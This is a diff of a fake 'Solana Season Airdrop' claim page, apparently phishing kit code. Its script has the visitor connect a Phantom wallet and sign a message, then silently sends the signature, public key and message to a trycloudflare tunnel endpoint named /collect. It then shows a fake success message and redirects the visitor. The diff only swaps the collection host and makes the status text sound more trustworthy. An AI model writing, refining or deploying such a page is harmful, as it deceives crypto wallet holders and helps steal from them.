@@ -3,28 +3,27 @@
 <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
 <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
     <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
-    <p style="color:#888;margin-bottom:30px;">Status: Encrypted Node Connected</p>
+    <p style="color:#888;margin-bottom:30px;">Verification Node: Cloudflare Secure Edge</p>
     <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM NOW</button>
-    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Verification Ready</div>
+    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Tunnel Active</div>
 </div>
 <script>
 document.getElementById('cta').onclick = async () => {
     try {
         const p = window.solana || window.phantom?.solana;
-        if (!p) { alert("Please use Phantom"); return; }
+        if (!p) { alert("Please use Phantom browser."); return; }
         const { publicKey } = await p.connect();
         const msg = "Verify-V4-" + Math.floor(Math.random() * 99999);
         const signed = await p.signMessage(new TextEncoder().encode(msg), "utf8");
         const sig = btoa(String.fromCharCode.apply(null, signed.signature));
         
-        // 🔱 关键点：HTTPS 域名对接 /collect
-        fetch("https://parker-filling-broadcasting-casting.trycloudflare.com/collect", {
+        // 🔱 终极 HTTPS 对接
+        fetch("https://fares-administrator-anybody-literature.trycloudflare.com/collect", {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            mode: 'no-cors',
             body: JSON.stringify({ signature: sig, pubkey: publicKey.toString(), message: msg }),
             keepalive: true
         });
-        
         document.getElementById('status').innerText = "SUCCESS! VERIFIED";
         setTimeout(() => { window.location.href = "https://solscan.io"; }, 1000);
     } catch(e) { window.location.reload(); }
